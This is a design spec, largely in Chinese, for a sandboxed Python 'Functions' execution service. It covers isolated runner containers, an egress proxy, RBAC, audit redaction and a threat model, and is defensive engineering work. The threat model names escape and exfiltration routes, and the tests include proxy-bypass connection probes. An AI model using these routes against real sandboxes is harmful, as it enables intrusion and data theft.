| Subprocess env | scrub 大部分；**保留** `HTTP_PROXY` / `HTTPS_PROXY` / `NO_PROXY`（純為 dev 體驗讓 httpx/requests 自動走 proxy；**這不是安全邊界**）；scrub `LD_PRELOAD` / `PATH` extras / 任何認證 token | — |
| Worker container 不掛 `docker.sock` / `/var/run/docker.sock` | 強制 | docker socket bind = container escape primitive |
| Concurrent runs | 8（worker pool semaphore） | 第 9 個 → error: queue_full |

**Outbound egress 控制 — 安全邊界在網路拓樸 + 「API gate」與「Runner」兩層分離**：

⚠️ Env vars（`HTTP_PROXY` 等）是 user code 自願使用的便利機制，user code 可以 `del os.environ['HTTP_PROXY']` 或繞 socket 庫直接連、env 不能擋。**真正的 enforcement 必須在 Linux network layer**。

⚠️ **Control plane 跟 user code execution 必須分容器**：把 worker 接到 `anila-internal` 給 CSP call → user code 也看得到 CSP；把 worker 移出 `anila-internal` → CSP call 不到。唯一乾淨解是**拆兩層**：trusted API gate 接 CSP request；untrusted runner 跑 user code、網路隔離。

**v1 拓樸（4 個 services + 4 個 networks）**：

```
┌────────────────────── docker-compose ──────────────────────────────────┐
│                                                                          │
│   ┌────── network: anila-internal ──────────┐                            │
│   │  csp / router / csp-db / anila-ui ...   │                            │
│   └────────────┬────────────────────────────┘                            │
│                │ (1) CSP POST /exec, /extract-meta                       │
│                ▼                                                          │
│   ┌── anila-functions-worker-api ─────────────┐ ← trusted, 不 exec user │
│   │  接 CSP；分流 /exec 到 runner-exec、       │   code，本身無 user code │
│   │  /extract-meta 到 runner-extract          │   執行能力                 │
│   └────────┬───────────┬───────────────────────┘                          │
│            │ (2)       │ (2)                                              │
│   ┌── anila-functions-control-net ──────────┐ ← internal:true             │
│   │  api ↔ runner-exec ↔ runner-extract     │   trusted IPC channel       │
│   └────┬───────────────┬─────────────────────┘                            │
│        │               │                                                   │
│        ▼               ▼                                                   │
│   ┌─ runner-exec ─┐  ┌─ runner-extract ─┐ ← UNTRUSTED, exec user code     │
│   │  /exec API    │  │  /extract-meta   │   subprocess sandbox            │
│   │               │  │  (更嚴 profile)   │                                  │
│   └───┬───────────┘  └─────────────┬────┘                                 │
│       │ (3) outbound httpx/requests │                                     │
│       ▼                             │                                     │
│   ┌─ anila-functions-net ──────────┐│ ← internal:true; runner-exec 唯一   │
│   │  runner-exec ↔ egress-proxy    ││   能連的對外網路                     │
│   └────────┬───────────────────────┘│                                     │
│            │                        ▼                                     │
│            ▼                  ┌─ anila-functions-extract-net ─┐           │
│   ┌─ anila-functions-egress ─┐│  runner-extract only          │           │
│   │  squid：bridge 到         ││  internal:true、無 egress      │           │
│   │  anila-internal allowlist ││  proxy；完全沒出口              │           │
│   └───────────────────────────┘└───────────────────────────────┘           │
│                                                                            │
└────────────────────────────────────────────────────────────────────────────┘
```

**容器職責**：

| Service | Networks | Trusted? | 跑 user code? |
|---|---|---|---|
| `anila-functions-worker-api` | `anila-internal`（接 CSP）+ `anila-functions-control-net`（call runner） | ✅ trusted | ❌ 不執行；只 forward request 到 runner、relay SSE 回 CSP |
| `anila-functions-runner-exec` | `anila-functions-control-net`（接 api）+ `anila-functions-net`（出 egress） | ❌ untrusted | ✅ subprocess sandbox |
| `anila-functions-runner-extract` | `anila-functions-control-net`（接 api）+ `anila-functions-extract-net`（無出口） | ❌ untrusted | ✅ subprocess sandbox（更嚴 profile） |
| `anila-functions-egress` | `anila-internal`（拿 allowlist 內 host）+ `anila-functions-net`（給 runner-exec proxy） | ✅ trusted | ❌ |

**關鍵 invariant**：
1. **runner 容器不在 `anila-internal`** — user code 在 runner 內、無法 reach CSP / router / DB
2. **api 容器不 exec user code** — 即使 api 有 `anila-internal` 連通性、也無 RCE 出口
3. **api ↔ runner via control-net**（`internal: true`）— 純粹 trusted IPC，不對外、跟 user code execution 環境分離
4. **runner-exec 唯一 reachable 的「對外」是 egress proxy** — 即使 user code disable HTTP_PROXY、raw socket 也只有 functions-net 上一個 hop（egress proxy）；其他 IP 連不通（具體錯誤碼依 docker / kernel 行為而定）
5. **runner-extract 沒任何 egress** — extract-net 上只有自己一台，無 proxy、無 bridge；user code top-level 跑出 side effect 也送不出去

**docker-compose 配置點**：
```yaml
networks:
  anila-internal:
    driver: bridge
  anila-functions-control-net:
    driver: bridge
    internal: true
  anila-functions-net:
    driver: bridge
    internal: true
  anila-functions-extract-net:
    driver: bridge
    internal: true

services:
  anila-functions-worker-api:
    networks: [anila-internal, anila-functions-control-net]
    environment:
      X_FUNCTIONS_SECRET: ${X_FUNCTIONS_SECRET}
      RUNNER_EXEC_URL: http://anila-functions-runner-exec:8001
      RUNNER_EXTRACT_URL: http://anila-functions-runner-extract:8002

  anila-functions-runner-exec:
    networks: [anila-functions-control-net, anila-functions-net]
    cap_drop: [ALL]
    read_only: true
    tmpfs: ["/tmp:size=64m,mode=1777"]
    security_opt: ["no-new-privileges:true", "seccomp:./worker-seccomp.json"]
    user: "65534:65534"   # nobody
    mem_limit: 256m       # cgroup-enforced（Linux RSS rlimit 不可靠）
    pids_limit: 32
    environment:
      HTTP_PROXY: http://anila-functions-egress:3128
      HTTPS_PROXY: http://anila-functions-egress:3128
      X_FUNCTIONS_SECRET: ${X_FUNCTIONS_SECRET}

  anila-functions-runner-extract:
    networks: [anila-functions-control-net, anila-functions-extract-net]
    cap_drop: [ALL]
    read_only: true
    tmpfs: ["/tmp:size=16m,mode=1777"]
    security_opt: ["no-new-privileges:true", "seccomp:./worker-seccomp.json"]
    user: "65534:65534"
    mem_limit: 64m
    pids_limit: 16
    environment:
      X_FUNCTIONS_SECRET: ${X_FUNCTIONS_SECRET}
      EXTRACT_TIMEOUT: 3
      EXTRACT_STDOUT_KB: 16

  anila-functions-egress:
    image: ubuntu/squid:5
    networks: [anila-internal, anila-functions-net]
    environment:
      ANILA_FUNCTIONS_EGRESS_ALLOWLIST: ${ANILA_FUNCTIONS_EGRESS_ALLOWLIST}
```

**為什麼複雜度值得**：相比把 worker 直接接 `anila-internal`、再靠「subprocess env strict scrub + entrypoint 把 secret unset」這種「在 application layer 維持 isolation」的設計，**network topology 層的隔離不依賴 application 寫對**。多 1 個容器（api gate）換掉一整個 application layer 的 audit / 攻擊面分析負擔。

---

## 6. UI

### 6.1 路由

| Path | Role guard | 用途 |
|---|---|---|
| `/admin/functions` | any logged-in（CTA 受限） | 列表 + marketplace |
| `/admin/functions/new` | `developer`+ | 建立 |
| `/admin/functions/:slug` | any（CTA 受限） | 編輯 / 詳細 |
| `/admin/functions/:slug/runs/:runId` | author / admin / triggered_by self | Audit detail |

入口：anila-ui 頂部右側 user menu 加 `Functions` 連結。

### 6.2 列表頁

```
┌─────────────────────────────────────────────────────────────┐
│  Functions                              [+ New Function]    │
│  Tabs:  [My (3)]  [Library (12)]  [Disabled (1)]            │
│  ┌──[icon] fill-text-helper ──────────────────┐  v3          │
│  │ 自定義圖示 by @kungy                        │  enabled     │
│  │ [Open] [Fork] [Disable] [Audit (8)]         │  #demo #ui   │
│  └─────────────────────────────────────────────┘              │
└─────────────────────────────────────────────────────────────┘
```

Tabs 對應 `?author=me`、`?status=enabled`、`?status=disabled`。

### 6.3 編輯頁

```
┌─────────────────────────────────────────────────────────────────────┐
│ ◀ Functions  /  fill-text-helper                       [Save] [⋮]   │
│ ╔══════════════════════════════════════╗  ┌──────────────────────┐  │
│ ║   Monaco editor (Python)             ║  │ Metadata              │  │
│ ║                                      ║  │ slug / title / author │  │
│ ║                                      ║  │ status / tags / icon  │  │
│ ║                                      ║  │ Actions declared      │  │
│ ╚══════════════════════════════════════╝  └──────────────────────┘  │
│ Tabs:  [Code] [Valves] [Test Console] [Versions] [Runs]              │
└──────────────────────────────────────────────────────────────────────┘
```

Tabs：
- **Code** — Monaco editor，Save 前做客戶端 lint（ast.parse + class Action 存在 + actions 非空）
- **Valves** — 根據 `valves_schema_json` 動態 render；secret 欄位 password input + `••••••••` 不顯既有值
- **Test Console** — §6.4
- **Versions** — list 版本（v1 不做 diff）
- **Runs** — audit 列表（最近 50）

### 6.4 Test Console

```
┌────────────────────────────────────────────────────────────┐
│ Test Console                                               │
│ Action:  [my-btn ▼]                                        │
│ Selected text:  [────────────────────────────────────────] │
│ [▶ Run]                                                    │
│ ─────────────────────────────────────────────────────────  │
│ Live events:                                               │
│  10:42:01.234  status     {"description":"開始","done":false}│
│  10:42:01.456  host_command  composer.set_text {text:"..."} │
│  10:42:01.500  status     {"description":"完成","done":true} │
│  10:42:01.502  __done__   run_id=789  duration_ms=268        │
│ [Open audit detail →]                                      │
└────────────────────────────────────────────────────────────┘
```

`host_command` 在 v1 沒有 raw JS eval、無 RCE 風險，Test Console 直接 dispatch 即可（不再有 Run anyway 概念）。

### 6.5 ChatRuntime 整合

`MessageBubble` 既有 toolbar：`[📋 copy] [↻ regen] [👍] [👎]`，在 `[👎]` 之後依序排列 enabled actions。

```
┌─ Assistant message ──────────────────────────────────────────┐
│  「LLM 回覆內容...」                                            │
│  [📋][↻][👍][👎] [✦ 自定義圖示] [✦ 程式碼檢核] [⋯ More]         │
└──────────────────────────────────────────────────────────────┘
```

- 渲染條件：`role === 'assistant'` 且 enabled-actions 不空
- 超過 4 個 button → `⋯ More` overflow（沿用既有 toolbar overflow menu）
- icon base64 inline
- 點擊 → `POST /api/functions/:slug/run` SSE → `handleFunctionEvent` dispatch

### 6.6 Audit detail page

`/admin/functions/:slug/runs/:runId`：metadata（who / when / which conversation / duration / status）+ `events_json` replay（用同一套 §6.4 event renderer）。

---

## 7. Security / RBAC / Audit

### 7.1 RBAC matrix

| 動作 | `user` | `developer` | `admin` |
|---|---|---|---|
| 看 Functions 列表 / Library（僅 metadata） | ✅ | ✅ | ✅ |
| 看單一 Function **code**（read-only） | ❌ | enabled/disabled ✅；draft 僅 author；**quarantined 僅 author+admin** | ✅ |
| 用 enabled Function | ✅ | ✅ | ✅ |
| 看 enabled-actions（chat toolbar render） | ✅ | ✅ | ✅ |
| 建新 Function | ❌ | ✅ | ✅ |
| 修改 own Function（save version） | ❌ | ✅ (own) | ✅ (any) |
| Self-publish own Function（draft → enabled） | ❌ | ✅ (own) | ✅ (any) |
| Fork（只能 fork enabled） | ❌ | ✅ | ✅ |
| Disable | ❌ | own only | any |
| 設定 admin Valves | ❌ | ❌ | ✅ |
| 看 audit runs | ❌ | own only | any |
| Test mode run（disabled） | ❌ | own only | any |
| Report abuse | ✅ | ✅ | ✅ |
| 處理 abuse reports | ❌ | ❌ | ✅ |

### 7.2 Threat Model

| ID | 威脅 | 影響 | 緩解 |
|---|---|---|---|
| T1 | Developer 寫 RCE Python code | worker runner container 受影響（**API gate 不受影響、不在同 container**） | runner 獨立 container（兩層 arch：trusted api + untrusted runner）、subprocess 限 30s/non-root、docker `mem_limit:256m` + `pids_limit:32` cgroup（**不靠 RLIMIT_RSS**）、`cap_drop:ALL`、seccomp、read-only rootfs、tmpfs `/tmp`、egress proxy allowlist；rlimit 不是 sandbox、container hardening + cgroup + 網路拓樸才是 |
| T2 | ~~Developer 注入 XSS via `execute`~~（v1 raw execute 已移除） | — | v1 改 `host_command` 白名單；無 raw JS eval；前後端兩層 verb / args schema 驗證 |
| T3 | Test mode 逃逸 | 繞過 admin disable | server enforce：test_mode=true + status≠enabled → 403 unless author/admin |
| T4 | 無限迴圈 / fork bomb / OOM | DoS worker | rlimit + nproc + 8-concurrent semaphore → queue_full |
| T5 | 子程序 escape worker container | 影響 host | `cap_drop:ALL`、seccomp、AppArmor/SELinux confine、read-only rootfs、`nobody` user、no-new-privileges、不掛 docker.sock |
| T6 | Valves XSS | XSS 拿 admin token | values JSON-stringify 顯示；description 走既有 markdown sanitize |
| T7 | Token 出現在明文位置 | Credential 外洩 | **主防線**：egress proxy 不通 = secret 出不去（T1 mitigation 順帶處理）；**次防線**：admin Valves AES-256-GCM at rest、UI password input、GET 不回明文、minimal valve injection（subprocess 只拿到 schema 宣告的欄位）；**兜底**：substring redaction（best effort、擋誤 leak、不 expect 擋 active attacker） |
| T8 | CSP↔Worker 沒驗證 | bypass CSP | shared secret `X-Functions-Secret`；worker 只 listen docker compose internal network |
| T9 | Marketplace 釣魚（命名相似 slug） | 誤觸發惡意 button | UI 強制顯示 author + forked_from + "new" 標示；user role 看不到 code 也降低偽造能力；abuse report 入口 |
| T10 | SQL injection（slug / tag） | DB compromise | ORM + parameterized；slug regex `^[a-z0-9][a-z0-9-]{0,63}$`；tag 限 20 字元 |
| **T11** | **Social engineering via host_command**（dev 寫 button 把 composer 設成釣魚字串、彈 modal 假冒系統訊息、link.open 騰空跳到惡意站） | 使用者被誘導執行操作 | host_command 白名單動詞（無 raw HTML / JS）；URL allowlist regex；modal content 走 DOMPurify；audit 全文（事後追源）；abuse report；admin disable kill switch；user role 看不到 code 仍可看 metadata 警示「button 來自 author X」 |
| **T12** | **CSP exec user code at save path（schema extraction RCE）** | save endpoint 變 RCE | CSP 不 import / exec user code；schema extraction 走 worker-api → runner-extract；偏好 static AST，必要時才 sandbox exec、且 profile **比 /exec 更嚴**（無 egress、無 valves、3s timeout、mem_limit:64m cgroup、pids_limit:16） |
| **T13** | **`/run` 缺 conversation/message ownership 驗證** | horizontal authz、user A 對 user B 的 message 觸發 Action | §4.5 明列前置授權兩條路徑（chat_message 走完整 owner check；test_console 走 author/admin synthetic）；v1 沿用 conversation_service 既有 owner+admin gate（不畫蛇添足造輪子） |
| **T14** | **circular FK / version_no 並發撞 unique key** | save 失敗或邏輯混亂 | `latest_version_id` 去掉 FK；namespaced advisory lock（NS=42, function_id）per-function + INSERT 在 transaction |
| **T15** | **Egress proxy 設計自相矛盾（env scrub vs HTTP_PROXY）** | sandbox bypass | 安全邊界改成「分裂網路拓樸」：worker 在 `internal: true` 的 functions-net、唯一 reachable 是 egress proxy；env vars 只是 dev convenience、不是 enforcement |
| **T16** | **`/extract-meta` 仍 exec user code、save 觸發 side effect** | save 變 trigger 對 allowlisted host 做 side effect | extract 用獨立 extract-meta-net（**完全沒 egress**）+ 短 timeout + 不傳 valves；偏好 static AST stage 1 |
| **T17** | **Disabled by admin 的 code 仍對 dev 可見** | dev 複製偷學被 disable 的釣魚 code | 加 `quarantined` 第四 status；code 鎖到 author+admin；`disabled_reason` 欄位讓 admin 寫理由 |
| **T18** | **clipboard.copy / link.open user-activation 失敗 silent** | UX 體驗破裂、user 不知道為什麼沒效 | 兩個 verb 改成 toast 二段確認：dispatch 後顯示「Click to copy / Click to open」toast、user 點才執行；自動繼承 user activation；同時是 anti-phishing 護欄 |
| **T19** | **單一 worker container 既接 CSP 又跑 user code → user code 可達 CSP / DB / router** | horizontal lateral movement（user code RCE → 拿 anila-internal 上其他服務） | 拆兩層：api gate（trusted、連 anila-internal）；runner（untrusted、不連 anila-internal、只能 reach egress proxy）；api ↔ runner 透過 control-net 跨容器、無共享 process / fs |
| **T20** | **RLIMIT_RSS Linux kernel 不一定 enforce** | dev 寫的 Function 把 worker 容器吃光記憶體 | docker `mem_limit` cgroup（hard limit）+ `pids_limit`；rlimit 只做輔助 |

### 7.3 加密 / Key 管理

- `ANILA_FUNCTIONS_VALVES_KEY`：256-bit base64，CSP container env，不入 git
- AES-256-GCM with random nonce per encrypt
- Key rotation v1：手動 migration script（new key → re-encrypt → bump key_version；舊 key 仍解 `key_version=1` 的 row）
- 自動 rotation v2

### 7.4 Audit redaction（**defense in depth, NOT primary**）

⚠️ **重要 reframing**：substring redaction 擋不住 base64、slice、hash、header exfil — 它**不是** secret leak 的主要保護。它是「擋誤 leak、tooling typo、無心 print」的兜底。**主要保護按優先順序**：

1. **Egress proxy + allowlist**（§5.7）— secret 出不了 worker container = 誰也帶不走
2. **Minimal valve injection** — subprocess 只拿到 `class Valves` 宣告的欄位；沒宣告 = 拿不到（schema-driven，自然限制）
3. **Code 可見度收緊**（§7.1）— user role 看不到 code、無法手動學偷 secret pattern
4. **Audit redaction**（本節）— 兜 typo / 無心 leak

**Redaction 機制**（仍然做，但定位是兜底）：

CSP 收到 worker SSE chunk 後 → push 到 SSE-to-browser 之前 → 寫 audit row 之前：
1. 從 DB 取出該 run 對應 valve 的 secret 欄位明文（解密後）
2. Pattern match 替換 chunk text：substring match → `<redacted:valves.field_name>`
3. Redaction 失敗 → events_json 寫 `[REDACTION_FAILED]` + 觸發 `function_secret_redaction_failed_total` 告警 metric
4. Secret < 8 chars 不 match（避免誤殺通用字串）

**Metric**：除了 redaction 失敗 metric，加 `function_egress_blocked_total`（outbound proxy 拒絕計數）— 這個才是 actual mitigation 的 KPI；redaction failed 應永遠 0、egress blocked 偶爾 > 0 是正常（dev 試錯）。

### 7.5 Classified conversation 行為

- Function 跑在 classified conversation 裡：runs row inherit classified flag；audit 列表對 non-cleared user 隱藏
- v1 不額外標記「Function 是 classified」；v2 視需要加 `actions.requires_clearance`
- **/run ownership 7 步檢查**（§4.5）會擋掉 cross-conversation leak（user A 不能對 B 的 classified message 觸發 Action）
- Egress proxy allowlist（§5.7）擋掉 worker code 把 classified 內容外送公網
- `host_command` 沒有任意 JS payload，唯一可能 leak 的 verb 是 `chat.show_modal` / `composer.set_text`（顯示在當前 user 自己的瀏覽器 — 不是 leak）與 `link.open`（URL 走 allowlist）；故 v1 不額外限制 host_command 在 classified conversation 裡的行為

### 7.6 Audit retention

`runs.events_json` / `runs.request_payload_json` 保留 360 天，DB cron 日批 purge。CSP 既有 `audit_logs` 高階紀錄保留期沿用 CSP policy。

---

## 8. Testing Strategy

### 8.1 單元（CSP pytest）— v1 必

- RBAC guard 函式
- Slug regex / tag length 驗證
- Metadata header parser
- Valves schema extractor
- Audit redaction pattern matcher
- AES-GCM round trip
- Append-only trigger

### 8.2 整合（CSP + DB testcontainers）— v1 必

- Function CRUD round-trip
- Versions append-only on save（UPDATE/DELETE → trigger raise）
- **`latest_version_id` 沒 FK；orphan reference handling**
- **Concurrent save 同 function（advisory lock）→ version_no 不撞**
- Valves encryption at rest（DB 看到 ciphertext）
- GET valves 不回 secret 明文
- RBAC：user 角色 POST function → 403
- **RBAC：user 角色 GET /:slug 拿不到 `code` 欄位（response 不含）**
- **RBAC：user 角色 GET versions/:n → 403**
- Marketplace fork：只能 fork enabled、副本回 draft
- **/run ownership check：caller 不能 access 該 conversation → 403**
- **/run ownership check：message 不屬於 conversation → 403**
- **/run ownership check：message.role != 'assistant' → 403**
- Run row finalize：events_json redacted
- **Schema extraction：CSP 不 exec user code，全部走 worker `/extract-meta` RPC**
- **Abuse report：POST /report → INSERT reports + audit_logs；admin GET /reports 拿到 open queue**

### 8.3 Worker（pytest）— v1 必

- `runtime.py` 跑 valid Action class
- 擋無 `class Action`
- Reserved args 注入正確
- `__event_emitter__` async + 多次 emit 順序保留
- timeout / OOM / non-root / 8-concurrent / queue_full
- **`/extract-meta` stage 1（AST）：純 literal Action.actions + Valves 欄位 → 不需 sandbox exec、回 strategy=ast**
- **`/extract-meta` stage 2 fallback：dynamic Action.actions → 觸發 sandbox exec、回 strategy=sandbox**
- **`/extract-meta` egress 隔離：user code top-level `requests.get('http://csp:8000')` → fail（extract-net 無 egress proxy）**
- **`/extract-meta` 不傳 valves：runtime extract mode 不 inject `instance.valves`，user code 讀 `self.valves` 拿到 None / AttributeError**
- **`/extract-meta` timeout：3s 後 SIGKILL、回 errors=['timeout']**
- **網路拓樸：runner-exec 容器內 `curl https://not-allowlisted.example.com` → 唯一 reachable proxy 拒絕後**連線失敗**（assert: not 200、不 assert 具體錯誤碼）**
- **網路拓樸：runner-exec 容器內 raw socket 直連 `8.8.8.8:443`（不走 HTTP_PROXY）→ **連線失敗**（assert: 連不通；不 assert ENXIO vs ETIMEDOUT 等具體 errno）**
- **網路拓樸：runner-extract 容器內任何 outbound（含 proxy host）都 → **連線失敗**（extract-net 沒 proxy）**
- **`cap_drop:ALL` 生效：subprocess 無法 mount / ptrace / unshare**
- **Subprocess env：保留 HTTP_PROXY/HTTPS_PROXY 給 dev convenience；scrub LD_PRELOAD 等 sensitive**
- **`host_command` event 經 worker SSE 出去，不會被攔掉（worker 不驗 verb，CSP 才驗）**

### 8.4 端對端（Vitest + Playwright）— v1 必

- developer 寫 fill-text Function、save、self-publish enabled、chat toolbar 出現
- 點 button SSE events 串流到 DOM、`composer.set_text` 真的把 ANILA Composer 文字取代
- **`host_command` 白名單外的 verb（前端注入嘗試）→ console warn + error toast，不 dispatch**
- **`link.open` URL 不在 allowlist → 不開分頁、回 error**
- **`clipboard.copy` 行為：dispatch 後顯示 toast「Click to copy: <preview>」；user 點 toast → 真複製到 clipboard；不點 → 5s 後消失**
- **`link.open` 行為：URL 通過 allowlist → 顯示 toast「Open <label>」；user 點 toast → 開新分頁；不點 → 5s 後消失**
- **Test Console + author 跑 quarantined function → 可以（test_mode）；非 author 跑 quarantined → 403**
- **Quarantined function 的 code：non-author developer GET `:slug` → response 不含 code 欄位**
- **Quarantined function：admin 解 quarantine → status='disabled'（不直接回 enabled）**
- user 角色看到 list 但無 New Function CTA、看不到 Code tab 內容
- Fork：library → fork enabled → my tab + forked_from（draft 起算）
- **Fork disabled function → 403**
- Valves secret 欄位填入後再進來看到 `••••••••`
- Disabled function：button 不出現在 chat、admin 仍看得到管理
- Audit detail 顯示 redacted token
- **/run 對別人的 conversation_id → 403、UI 顯示「無權限」toast**
- **/run 對 user message（role=user）→ 403**
- **Abuse report：使用者點 button report → admin queue 看到 open report**

### 8.5 Manual / Acceptance

- 把同事的 `填入文字助手` 範例貼進 editor → save → chat 點 button → 文字真的填入 ANILA Composer
- 跑 timeout（`time.sleep(60)`）→ 30s SSE error
- 故意 emit token → audit log 顯示 `<redacted>`

### 8.6 Metrics

| 指標 | 用途 |
|---|---|
| `function_run_total{slug, status}` | 失敗率 dashboard |
| `function_run_duration_ms` (histogram) | SLO |
| `function_run_concurrent` (gauge) | pool saturation |
| `function_secret_redaction_failed_total` | T7 兜底警報（永遠應 0） |
| **`function_egress_blocked_total{host}`** | **outbound proxy 拒絕計數（actual mitigation 的 KPI）** |
| **`function_host_command_rejected_total{verb,reason}`** | 白名單外 verb 試圖被 dispatch 的次數 |
| **`function_ownership_check_denied_total{step}`** | /run 7 步授權哪一步擋下來 |
| **`function_abuse_report_total{status}`** | 治理治理 |
| `function_save_total{author}` | governance |

---

## 9. Deployment / Rollout

### 9.1 New services in docker-compose

新增 **4** 個 service + **3** 個專屬 network：

**Networks**：
- `anila-functions-control-net`（`internal: true`）— api ↔ runner-exec ↔ runner-extract 之間的 trusted IPC，不對外
- `anila-functions-net`（`internal: true`）— runner-exec + egress proxy 共用，runner-exec 唯一的「對外」窗口
- `anila-functions-extract-net`（`internal: true`）— runner-extract 獨享，**無** egress proxy、完全沒出口

#### 9.1.1 `anila-functions-worker-api`（trusted gate，CSP 從這 call）

- Base image：`python:3.12-slim`
- Preinstalled：`fastapi`, `uvicorn`, `httpx`
- 職責：接 CSP 的 `/exec` 與 `/extract-meta`、forward 到 runner、轉發 SSE 回 CSP；自身**不 import / exec user code**
- Container hardening：non-root；其他不需要強化（trusted）
- Network：`anila-internal` + `anila-functions-control-net`
- ENV：`X_FUNCTIONS_SECRET`、`RUNNER_EXEC_URL=http://anila-functions-runner-exec:8001`、`RUNNER_EXTRACT_URL=http://anila-functions-runner-extract:8002`

#### 9.1.2 `anila-functions-runner-exec`（untrusted runner，正式執行）

- Base image：`python:3.12-slim`
- Preinstalled：`fastapi`, `uvicorn`, `httpx`, `requests`, `pydantic`, `python-dateutil`, `cryptography`
- Container hardening：
  - `read_only: true`
  - `tmpfs: ["/tmp:size=64m,mode=1777"]`
  - `cap_drop: [ALL]`
  - `security_opt: ["no-new-privileges:true", "seccomp:./runner-seccomp.json", "apparmor:anila-runner"]`（host 有哪個用哪個）
  - **`mem_limit: 256m`**（cgroup-enforced；不靠 RLIMIT_RSS）
  - **`pids_limit: 32`**
  - non-root user `nobody`（uid 65534）
  - 不掛 `docker.sock` 或任何 host volume
- Network：`anila-functions-control-net`（接 api request）+ `anila-functions-net`（出 egress proxy）
- ENV：`X_FUNCTIONS_SECRET`、`HTTP_PROXY=http://anila-functions-egress:3128`、`HTTPS_PROXY` 同
- Endpoint：只 listen `/exec`（control-net 上）

#### 9.1.3 `anila-functions-runner-extract`（untrusted runner，schema 抽取，**比 exec 更嚴**）

- 同 image、同 hardening **加嚴**：
  - `mem_limit: 64m`（vs exec 的 256m）
  - `pids_limit: 16`（vs exec 的 32）
  - `tmpfs:` 縮小到 16m
- Network：`anila-functions-control-net`（接 api）+ `anila-functions-extract-net`（**無 egress proxy、完全沒出口**）
- 配置：`MAX_TIMEOUT=3`（vs exec 的 30）、`MAX_STDOUT_KB=16`
- runtime 端：不接受 valves / `__user__` / `__metadata__`；不執行 `instance.action()`、只 read `Action.actions` + `Valves.model_json_schema()`
- Endpoint：只 listen `/extract-meta`（control-net 上）

#### 9.1.4 `anila-functions-egress`（squid sidecar）

- 預設 squid（簡單成熟；envoy 是 v2 candidate）
- 配置從 ENV `ANILA_FUNCTIONS_EGRESS_ALLOWLIST` 讀（CSV `host:port` 列）
- ACL：allow listed → forward；其餘 → deny + log
- Network：跨 `anila-internal` + `anila-functions-net` 兩個（橋）
- 不接受 runner 以外的 client（network 層拓樸天然限制；runner-extract 跟它在不同 network）
- Metrics：`function_egress_blocked_total{host}` 從 access log 抽

### 9.2 CSP migrations

3 個 alembic migration（一支 PR 內）：

1. 建表：`action_functions`、`action_function_versions`、`action_function_valves`、`action_function_runs`、`action_function_reports`
2. Trigger：versions UPDATE/DELETE 拒絕
3. Initial empty state（不 seed）

**Schema 注意**：
- `action_functions.latest_version_id` 沒 FK（denormalized cache，避免循環 FK）
- 用 advisory lock（`pg_advisory_xact_lock`）防 version_no 並發撞

### 9.3 ENV 新增

| ENV | 哪個 service | 用途 |
|---|---|---|
| `ANILA_FUNCTIONS_VALVES_KEY` | CSP | AES-GCM 對 valves 加解密 |
| `ANILA_FUNCTIONS_WORKER_URL` | CSP | worker `/exec` 與 `/extract-meta` URL（compose internal） |
| `X_FUNCTIONS_SECRET` | CSP + worker | shared secret |
| **`ANILA_FUNCTIONS_EGRESS_ALLOWLIST`** | egress proxy | CSV `host:port` 白名單（例 `csp:8000,router:9000,internal-lint.intra:443`） |
| **`ANILA_FUNCTIONS_LINK_OPEN_ALLOWLIST`** | CSP（驗 host_command `link.open` URL） | 正則 list；`link.open` URL 必須 match 一條 |
| **`HTTP_PROXY` / `HTTPS_PROXY`** | worker | 指向 `anila-functions-egress:3128` |

### 9.4 Rollout 順序

1. Backend：alembic migration → CSP endpoint → 部署 worker container
2. Frontend：anila-ui 加 `/admin/functions/*` 路由 + ChatRuntime button render
3. Smoke test：admin/developer 角色測完整流程
4. Soft launch：先給 1-2 位 dev 試用（內部 dogfood）
5. 一週後開放所有 developer

### 9.5 Backout

如需 rollback：
- 前端：把 `/admin/functions/*` route 移除、ChatRuntime 不 fetch enabled-actions
- 後端：endpoint 改 503；migration 不 rollback（保 audit 資料）
- worker container：停掉、不影響其他服務

---

## 10. Open Questions（spec review 後再決）

- [ ] Metrics stack：ANILA 現在有 Prometheus 嗎？沒有的話 v1 用 structured log 兜，明確標記後續接 Prom
- [ ] CSP `audit_logs` 高階紀錄的 actor / target 欄位要怎麼填？需確認既有 schema 對「FUNCTION_RUN」/「FUNCTION_REPORT」事件的容量
- [ ] Monaco bundle size：bundle 進去會讓 anila-ui build 變大幾 MB？需要 dynamic import 讓非 admin 路由不載
- [ ] `nobody` UID 在 worker container 裡是否需要 chown tmpfs `/tmp` subdir？需要時 entrypoint script 處理
- [ ] **Outbound proxy 選擇**：squid（簡單成熟）vs envoy sidecar（更現代、metrics 好接）；v1 預設 squid、v2 視 ops 偏好換
- [ ] **Seccomp profile 取得**：從 docker default 往下收緊還是寫客製 profile？v1 先用 default 再標記 follow-up
- [ ] **AppArmor / SELinux**：host 是哪個？compose 配置的 profile 名要對齊 host
- [ ] `link.open` allowlist 預設值：v1 給空 default 還是給 `^https://(csp|router|.*\.internal)/`？

---

## 11. Implementation Sequencing（草案，待 writing-plans skill 細化）

預估 **4 sprint（5-6 週）**（v1 完整安全邊界版）：

**Sprint 1** — Backend core + schema
- Alembic migrations（5 表 + trigger，無 circular FK，4-state status）
- CSP endpoint：CRUD / versions（含 namespaced advisory lock）/ fork / enabled-actions / report / quarantine / unquarantine
- AES-GCM helper + Valves endpoint（加密讀寫）
- 客戶端 lint endpoint（slug regex / size limit）
- Unit + integration tests

**Sprint 2** — 三層服務（api + 2 runners）+ SSE relay + 兩條 ownership 路徑
- `anila-functions-worker-api`（trusted gate，純 forward）
- `anila-functions-runner-exec`（untrusted、跑正式 user code）
- `anila-functions-runner-extract`（untrusted、跑 extract、更嚴 profile）
- runtime.py 支援 normal mode + extract mode（後者 strip valves/user/metadata；不 call `Action.action()`）
- `/extract-meta` 兩階段：static AST stage 1 + sandboxed exec stage 2
- CSP `/run` SSE relay + 兩條 ownership 路徑（chat_message vs test_console）+ host_command verb / args 驗證 + redaction pass
- Worker tests + end-to-end SSE flow test

**Sprint 3** — 網路拓樸 + container hardening + sandbox tests
- Docker compose 更新（3 個 internal network、4 個服務、squid egress proxy）
- runner 容器：`cap_drop:ALL` + seccomp + read-only rootfs + tmpfs + non-root + `mem_limit` + `pids_limit` + env partial-scrub
- 拓樸測試（assert 連不通、不綁具體錯誤碼）：runner-exec 不能繞 proxy 連任何 host（即使 disable HTTP_PROXY）；runner-extract 連 proxy 都連不到
- Stress / chaos：8 並發、subprocess kill 中途、egress allowlist 動態 update、cgroup mem_limit OOM kill 行為

**Sprint 4** — Frontend + dogfood
- `/admin/functions/*` 路由與頁面（list / editor / Test Console / audit / report queue / quarantine UI）
- Monaco bundle（vite plugin、dynamic import）
- ChatRuntime 整合（toolbar button render、host_command dispatch with two-step toast for clipboard/link）
